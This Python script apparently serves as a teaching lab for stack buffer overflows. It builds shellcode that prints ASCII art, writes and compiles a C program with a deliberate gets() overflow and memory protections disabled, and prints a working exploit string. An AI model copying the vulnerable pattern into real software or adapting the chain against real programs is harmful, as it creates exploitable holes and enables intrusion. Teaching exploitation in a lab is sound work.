# Note, you must disable ASLR for this to work
# sudo sysctl kernel.randomize_va_space=0 on debian

# Usage: python3 ./string_shellcode.py art.ascii
# Program will spit out exploit string and vuln.out file
# Running the exploit:
# printf "PROGRAM_OUTPUT_STRING" | ./vuln.out
# yay?

import os
import subprocess
import sys


# Shortcut to write to stderr
def log(msg):
    print(msg, file=sys.stderr)


# Read ascii art from a plaintext file
def read_art(artfile):
    art = ""  # Art as one long string
    log(f"Reading art file {artfile}")
    art = open(artfile, "r").read()
    log("Done reading art file")
    return art


# We're going to write our ascii art onto the program's
# stack 4 characters at a time (32-bit program means
# we've got 4 chars per register / push statement).
def push_art(art):
    div = 0  # divisions, i.e. 4 chars at a time
    padding = ""  # we may need to pad with extra spaces
    byte_count = 0  # keep track of total number of bytes
    output = list()  # List of 4 char sequences to push on stack
    lines = 0  # number of push commands

    # Do we need 0, 1, 2, 3 padding spaces?
    log(f"Need {4-(len(art)%4)} bytes. Adding space characters (\\0x20)")
    for i in range(0, 4 - (len(art) % 4)):
        padding += "20"

    # Work backwards through the string to build the
    # push statements (since stacks are last-in-first-out
    for i in range(len(art) - 1, -1, -1):
        # for each new push statement
        if div == 0:
            # start the push statement
            output.append("push 0x")
            # if we have padding to "spend")
            if len(padding) > 0:
                # add the padding
                output[lines] += padding
                # padding is two digits (1 byte)
                # so add half padding to total byte count
                # and number of chars so far
                div += int(len(padding) / 2)
                byte_count += int(len(padding) / 2)
                # once we've used the padding once, get rid of it
                padding = ""

        # Add the ascii character as a hex value
        output[lines] += "{0:02x}".format(ord(art[i]), "x")
        byte_count += 1
        div += 1

        # if we've hit 4 characters in the push statement, start a new one
        if div >= 4:
            div = 0
            output[lines] += "\n"
            lines += 1
    return output, byte_count


# We need to do some asm work to make sure that the shellcode does not
# contain any \\0x0a characters. The newline is a string terminator
# for a lot of read functions, so it will stop reading our shellcode
# if it contains newlines. We'll fix this by "adding" one to the value
# 0x09 and then pushing the result onto the stack.
def fix_string_terminators(push_statements):
    bigstring = ""
    # Check to see where the 0a might be (if any)
    # There is likely a better way to do this but I don't care
    # Basically, depending on where the 0a is, shift a 1 into that position in the eax register
    # Then add the 4 characters (where one is 0x09) to eax.
    for line in push_statements:
        if line[7:9] == "0a":
            line = line[0:7] + "09" + line[9:]
            s1 = "\txor eax, eax\n"
            s2 = "\tmov al, 0x1\n"
            s3 = "\tshl eax, 0x18\n"
            line = s1 + s2 + s3 + line
            line = line.replace("push", "\tadd eax,")
            line = line + "\tpush eax\n"
        elif line[9:11] == "0a":
            line = line[0:9] + "09" + line[11:]
            s1 = "\txor eax, eax\n"
            s2 = "\tmov al, 0x1\n"
            s3 = "\tshl eax, 0x10\n"
            line = s1 + s2 + s3 + line
            line = line.replace("push", "\tadd eax,")
            line = line + "\tpush eax\n"
        elif line[11:13] == "0a":
            line = line[0:11] + "09" + line[13:]
            line = line.replace("push", "\tmov eax,")
            line += "\tinc ah\n"
            line += "\tpush eax\n"
        elif line[13:15] == "0a":
            line = line[0:13] + "09" + line[15:]
            line = line.replace("push", "\tmov eax,")
            line += "\tinc al\n"
            line += "\tpush eax\n"
        else:
            line = "\t" + line
        bigstring += line
    return bigstring


def write_asm_file(filename, string_of_push_statements, byte_count):
    asmfile = filename + ".asm"
    with open(asmfile, "w") as f:
        f.write("global _start\n")  # start in main
        f.write("section .text\n")  # text section for instructions
        f.write("_start:\n")  # main
        f.write("\txor ecx, ecx\n")  # clear ecx
        f.write("\tpush ecx\n")  # push ecx (null terminator)
        f.write(string_of_push_statements + "\n")
        f.write("\txor eax, eax\n")  # clear eax
        f.write("\txor ebx, ebx\n")  # clear ebx
        f.write("\txor ecx, ecx\n")  # clear ecx
        f.write("\txor edx, edx\n")  # clear edx
        f.write("\tmov al, 0x04\n")  # write is syscall number 4
        f.write("\tmov bl, 0x01\n")  # write to file descriptor 1 (stdout)
        f.write("\tmov ecx, esp\n")  # address of string (top of stack)
        # gotta be careful which dx we write into, based on byte_count
        if byte_count <= 255:
            f.write("\tmov dl, ")  # number of bytes to write
        elif 255 < byte_count <= 65535:
            f.write("\tmov dx, ")
        f.write(hex(byte_count) + "\n")
        f.write("\tint 0x80\n")  # do syscall
    return asmfile


def assemble_and_link_asm_file(asmfile, filename):
    # requires nasm
    objfile = filename + ".o"
    outfile = filename + ".out"

    # assemble/link
    subprocess.run(["nasm", "-f", "elf32", asmfile])
    subprocess.run(["ld", "-melf_i386", objfile, "-o", outfile])

    # Comment these out if you want to examine the assembly file
    os.remove(asmfile)
    os.remove(objfile)

    return outfile


# Use objdump -d to spit out the opcodes and do some pasring
def get_opcodes(program):
    # objdump -d will dump assembly and opcodes for the text section
    cp = subprocess.run(["objdump", "-d", program], capture_output=True)
    # The default output is gross so we're trying to separate just the opcodes
    lines = str(cp.stdout).split("\\n")
    lines = lines[7:-1]
    opcodes = ""
    for line in lines:
        line = line.split("\\t")[1]
        line = line.split(" ")
        for opcode in line:
            if len(opcode) > 0:
                opcodes += "\\x" + opcode
    os.remove(program)
    return opcodes


# write a c program with a buffer overflow vuln in gets()
# need the opcodes to determine buffer length
def write_vulnerable_c_program(opcodes, art_len):
    vulnfile = "vuln.c"

    with open(vulnfile, "w") as f:
        f.write("#include <stdio.h>\n")
        f.write("void bad() {\n")
        # Determine buffer size
        # 4 bytes for ret addr
        # 4 bytes for old ebp
        # 4 bytes for 32->64 stuff
        # add len(msg) for length of string since it goes on stack
        buffersize = int(len(opcodes) / 4) + 12 + art_len
        # add an extra byte if its odd
        # left pad with nop
        # might not need this?
        # if (buffersize % 2 == 1):
        #    buffersize += 1
        #    opcodes = "\\x90" + opcodes

        f.write("\tchar buffer[" + str(buffersize) + "];\n")
        f.write("\tprintf(\"%p\\n\", buffer);\n")  # Print address of buffer
        f.write("\tgets(buffer);\n")  # vuln
        f.write("}\n")
        f.write("void main() {\n")
        f.write("\tbad();\n")
        f.write("}\n")
    return vulnfile, buffersize


# Compile the vulnerable program
def compile_vuln_file(vulnfile):
    # Lots of GCC switches for debugging and disabling memory protections
    # ld will warn that gets() is insecure
    output_file = "vuln.out"
    gcc = "gcc "
    gcc += "-fno-builtin "  # don't use built-in versions of printf or puts
    gcc += "-O0 "  # don't optimize the code
    gcc += "-z execstack "  # disable non-executable stacks
    gcc += "-fno-stack-protector "  # disable stack canaries
    gcc += "-ggdb "  # turn on debugging symbols to help gdb
    gcc += "-mpreferred-stack-boundary=2 "  # align stack to 2 byte boundaries
    gcc += "-m32 "  # we're building a 32-bit executable, you may need extra gcc stuff for this
    gcc += f"{vulnfile} -o {output_file}"
    log(f"Compile line: {gcc}")
    subprocess.run(gcc.split(" "), capture_output=True)
    return output_file


# The vulnerable C program prints the address of the buffer
# We'll run it once and grab the output so we can insert it
# into the sample exploit string
def get_buffer_address(vulnprogram):
    proc = subprocess.run([f"echo 'test' | ./{vulnprogram}"], shell=True, stdout=subprocess.PIPE, universal_newlines=True)
    # output holds return address we need for overflow
    output = proc.stdout
    # Need to flip the address because little endian
    # The program spits out something like 0xABCDEFGH
    # We need it in the form \xGH\xEF\xCD\xAB  (yay little endian)
    a = output[8:10]
    b = output[6:8]
    c = output[4:6]
    d = output[2:4]
    return f"\\x{a}\\x{b}\\x{c}\\x{d}"


def main():
    # usage
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} ascii_art_text_file")
        exit(0)

    # grab ascii art from file
    artfile = sys.argv[1]
    art = read_art(artfile)

    # write asm instructions to push art onto stack
    push_statements, byte_count = push_art(art)

    # remove any newline characters from the shellcode
    string_of_push_statements = fix_string_terminators(push_statements)

    # strip extension
    artfile_root = artfile[0:artfile.find(".")]

    # write assembly instructions to file
    asmfile = write_asm_file(artfile_root, string_of_push_statements, byte_count)

    # build into ELF executable
    program = assemble_and_link_asm_file(asmfile, artfile_root)

    # extract opcodes from ELF
    opcodes = get_opcodes(program)

    # Write a C program with a buffer overflow vuln (i.e. use gets())
    vulnfile, buffersize = write_vulnerable_c_program(opcodes, len(art))

    # Compile vulnerable program into an ELF
    vulnprogram = compile_vuln_file(vulnfile)

    # Run the vulnerable ELF once to get the address of the vulnerable buffer
    buffer_address = get_buffer_address(vulnprogram)

    # Exploit string
    print("Run this command to test your overflow:")
    print("printf \"", end="")
    print("\\x90" * (buffersize - int((len(opcodes) / 4)) - len(art)), end="")  # NOP Slide
    print(opcodes, end="")  # Shellcode
    print("\\x90" * (len(art) + 8), end="")  # Extra nops on stack since we'll be pushing the art into this area
    print(buffer_address, end="")  # overflow IP
    print(f"\" | ./{vulnprogram}")

    # Cleanup
    os.remove(vulnfile)


if __name__ == "__main__":
    main()
